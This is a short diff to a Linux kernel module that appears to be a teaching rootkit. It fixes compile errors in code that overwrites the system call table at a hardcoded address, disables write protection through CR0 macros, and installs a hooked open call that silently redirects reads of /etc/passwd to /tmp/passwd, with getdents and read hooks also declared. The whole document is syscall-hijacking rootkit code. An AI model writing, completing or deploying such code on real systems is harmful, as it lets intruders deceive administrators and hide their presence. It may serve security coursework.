@@ -9,6 +9,8 @@
 #include <asm/page.h>
 #include <asm/cacheflush.h>
 
+#include <linux/types.h>
+
 static int pid;
 module_param(pid, int, 0);
 
@@ -16,7 +18,7 @@ struct linux_dirent {
   u64 d_ino;
   s64 d_off;
   unsigned short d_reclen;
-  char d_name[BUFFLEN];
+  char d_name[];
 };
 
 //Macros for kernel functions to alter Control Register 0 (CR0)
@@ -44,15 +46,15 @@ static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00280;
 //should expect ti find its arguments on the stack (not in registers).
 //This is used for all system calls.
 asmlinkage int (*original_call)(const char *pathname, int flags);
-asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
-asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
+asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+asmlinkage size_t (*original_read)(int fd, void *buf, size_t count);
 
 //Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 {
   // printk(KERN_INFO "Very, very Sneaky!\n");
   if (!strcmp(pathname, "/etc/passwd")) {
-    copy_to_user(pathname, "/tmp/passwd", 12);
+    copy_to_user((void *)pathname, "/tmp/passwd", 12);
   }
   return original_call(pathname, flags);
 }
